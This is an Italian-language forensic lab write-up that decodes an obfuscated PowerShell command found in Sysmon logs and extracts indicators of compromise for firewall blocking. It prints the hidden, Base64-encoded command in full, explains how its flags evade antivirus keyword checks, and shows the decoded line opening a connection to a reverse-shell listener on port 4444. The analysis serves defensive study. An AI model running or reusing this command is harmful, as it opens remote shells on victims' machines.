# 📁 06-CyberChef-Analysis: Offuscamento e Decodifica Forense del Payload

## 🎯 Obiettivo della Fase
Analizzare, isolare e decifrare i payload offuscati individuati all'interno delle righe di comando di PowerShell, estraendo gli Indicatori di Compromissione (IoC) fondamentali per il contenimento della minaccia.

## 🔍 L'Analisi dell'Evasione (PowerShell Evasion)
Durante il monitoraggio dei processi con **EventID 1**, è stata intercettata un'istanza di PowerShell avviata con flag di mascheramento avanzati:
`powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEALgAyADUAMAAiACwANAA0ADQANAA=`

### 🕵️‍♂️ Analisi Tecnica dei Parametri:
- `-nop` (NoProfile): Impedisce il caricamento del profilo utente di PowerShell, velocizzando l'esecuzione ed evitando il tracciamento di script locali.
- `-w hidden` (WindowStyle Hidden): Nasconde la finestra del terminale sullo schermo dell'utente vittima, rendendo l'attacco invisibile.
- `-enc` (EncodedCommand): Accetta stringhe di comandi codificate in Base64 (UTF-16LE), bypassando i controlli statici degli Antivirus basati su parole chiave (es. "TCPClient").

---

## 🛠️ Procedura di Decodifica Forense
La stringa cifrata estratta dal SIEM è stata isolata e decodificata da formato Base64, rivelando il codice sorgente originale in chiaro:

```powershell
\$client = New-Object System.Net.Sockets.TCPClient("192.168.1.250", 4444)
```

## 🔍 Indicatori di Compromissione (IoC) Estratti
L'analisi forense sul codice decifrato ha permesso di isolare i vettori della minaccia, pronti per essere inseriti nelle regole di blocco del Firewall aziendale:
- **Server di Comando e Controllo (C2 IP)**: `192.168.1.250`
- **Porta Illegittima di Connessione**: `4444` (Porta predefinita utilizzata dal framework d'attacco Metasploit/Meterpreter per stabilire una Reverse Shell).
